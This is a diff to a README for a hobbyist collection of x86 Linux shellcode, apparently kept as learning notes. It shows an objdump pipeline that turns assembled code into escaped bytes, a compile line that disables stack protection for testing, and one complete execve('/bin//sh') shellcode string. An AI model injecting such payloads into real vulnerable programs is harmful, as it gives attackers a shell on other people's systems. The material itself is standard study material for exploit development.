@@ -1,6 +1,6 @@
 Some Shellcodes
 ====
-These are some sample shellcodes that i did in my free time.
+These are some shellcodes that i did in my free time.
 
 
 # 1. 'sh' shell shellcode
@@ -35,11 +35,15 @@ ex. to compile and link 'sh_shell.asm' file
 $ compile_link.sh shellcode_sh
 </pre>
 
-# Generate shellcodes from linked file 'shellcode_sh'
+# Generate shellcodes from linked file
 
 <pre>
 objdump -d ./shellcode_sh | grep '[0-9a-f]:'|grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' '| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/'
+</pre>
 
+ex. for 'shellcode_sh'
+
+<pre>
 "\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 </pre>
 
@@ -52,7 +56,7 @@ gcc -m32 -z execstack shellTest.c -o shellTest
 
 Final Note
 =====
-I am still learing coding shellcodes so i will be adding more shellcodes as i progress.
+I am still learning coding shellcodes so i will be adding more shellcodes as i progress.
 
 Author
 ====
